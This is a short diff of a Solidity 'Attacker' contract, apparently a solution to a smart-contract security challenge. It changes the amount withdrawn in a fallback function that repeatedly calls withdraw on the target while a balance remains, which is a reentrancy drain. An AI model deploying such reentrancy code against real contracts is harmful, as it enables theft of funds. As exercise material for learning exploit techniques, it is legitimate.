@@ -23,7 +23,7 @@ contract Attacker {
 
   fallback() external payable {
     if(challenge.balanceOf(address(this)) > 0){
-      challenge.withdraw(1 ether);
+      challenge.withdraw(0.001 ether);
     }
   }
 
